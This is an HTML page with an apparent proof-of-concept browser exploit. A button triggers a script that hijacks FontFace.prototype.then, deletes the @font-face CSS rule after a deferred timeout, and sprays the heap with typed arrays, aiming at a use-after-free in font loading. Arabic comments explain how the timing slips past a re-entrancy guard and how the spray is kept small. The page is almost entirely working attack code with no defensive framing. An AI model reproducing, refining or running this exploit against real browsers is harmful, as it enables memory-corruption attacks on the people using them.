<!DOCTYPE html>
<html>
<head>
    <style id="targetStyle">
        @font-face { 
            font-family: 'ExploitFont'; 
            src: url(data:font/woff2;base64,d09GMgABAAAAA); 
            unicode-range: U+0041; 
        }
    </style>
</head>
<body>
    <button onclick="triggerExploit()">Trigger Targeted Exploit</button>
    <script>
        function triggerExploit() {
            let sprayed = [];
            let font = new FontFace('ExploitFont', 'local(Arial)', { unicodeRange: 'U+0041' });
            document.fonts.add(font);

            // اعتراض عملية الـ then للتحكم في توقيت الـ UAF
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    // استخدام setTimeout لتأجيل الحذف للخروج من النطاق المحمي (Re-entrancy Guard)
                    setTimeout(() => {
                        try {
                            document.getElementById('targetStyle').sheet.deleteRule(0);
                            
                            // رش الذاكرة المحدود (100 كتلة) لتجنب الـ OOU
                            for (let i = 0; i < 100; i++) {
                                sprayed.push(new Uint32Array(32)); 
                            }
                            console.log("Heap spray complete.");
                        } catch(e) {
                            console.error("Spray error:", e);
                        }
                    }, 0);
                    return undefined;
                }
            });

            console.log("Triggering Font Loading...");
            document.fonts.load('1em ExploitFont', 'A');
        }
    </script>
</body>
</html>
